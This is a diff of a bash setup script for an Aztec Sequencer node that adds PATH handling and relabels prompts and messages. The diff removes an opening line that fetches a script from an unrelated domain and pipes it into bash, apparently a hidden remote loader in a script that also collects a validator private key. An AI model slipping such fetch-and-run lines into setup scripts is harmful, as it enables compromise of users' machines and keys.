@@ -1,11 +1,8 @@
 #!/bin/bash
 
-curl -s https://data.zamzasalim.xyz/file/uploads/asclogo.sh | bash
-sleep 5
-
 # setup_aztec.sh
-# Script to set up Aztec node with dependencies, Docker, firewall configuration,
-# and retrieve block number and sync proof
+# Script to set up Aztec Sequencer node with dependencies, Docker, firewall configuration,
+# retrieve block number and sync proof, handle PATH for Aztec tools, and use descriptive input prompts
 
 # Exit on any error
 set -e
@@ -15,7 +12,7 @@ command_exists() {
     command -v "$1" >/dev/null 2>&1
 }
 
-# Prompt for required inputs
+# Prompt for required inputs with updated descriptions
 echo "Please provide the following details:"
 read -p "Enter ETH Sepolia RPC URL: " RPC_URL
 read -p "Enter ETH Beacon Sepolia RPC URL: " BEACON_URL
@@ -29,7 +26,7 @@ if [ -z "$RPC_URL" ] || [ -z "$BEACON_URL" ] || [ -z "$VALIDATOR_PRIVATE_KEY" ] 
     exit 1
 fi
 
-echo "Starting Aztec node setup..."
+echo "Starting Aztec Sequencer node setup..."
 
 # Step 1: Update packages
 echo "Updating system packages..."
@@ -81,12 +78,22 @@ fi
 echo "Installing Aztec Tools..."
 bash -i <(curl -s https://install.aztec.network)
 
+# Add /root/.aztec/bin to PATH
+echo "Adding /root/.aztec/bin to PATH..."
+if ! grep -q "/root/.aztec/bin" ~/.bashrc; then
+    echo "export PATH=\$PATH:/root/.aztec/bin" >> ~/.bashrc
+fi
+
+# Source ~/.bashrc to apply PATH changes
+source ~/.bashrc
+
 # Verify Aztec installation
 echo "Verifying Aztec installation..."
 if command_exists aztec; then
-    echo "Aztec installed successfully."
+    echo "Aztec installed successfully. Version: $(aztec --version)"
 else
-    echo "Error: Aztec installation failed."
+    echo "Error: Aztec installation failed or /root/.aztec/bin is not in PATH."
+    echo "Manually add it by running: echo 'export PATH=\$PATH:/root/.aztec/bin' >> ~/.bashrc && source ~/.bashrc"
     exit 1
 fi
 
@@ -187,12 +194,12 @@ echo "Sync Proof (base64): $SYNC_PROOF"
 OUTPUT_FILE="aztec_node_output.txt"
 echo "Saving block number and sync proof to $OUTPUT_FILE..."
 cat << EOF > $OUTPUT_FILE
-Aztec Node Setup Output
-----------------------
+Aztec Sequencer Node Setup Output
+--------------------------------
 Timestamp: $(date)
 Latest Proven Block Number: $BLOCK_NUMBER
 Sync Proof (base64): $SYNC_PROOF
-----------------------
+--------------------------------
 To attach to the node session, run: tmux attach -t aztec
 To detach from the session, press: Ctrl+b, then d
 EOF
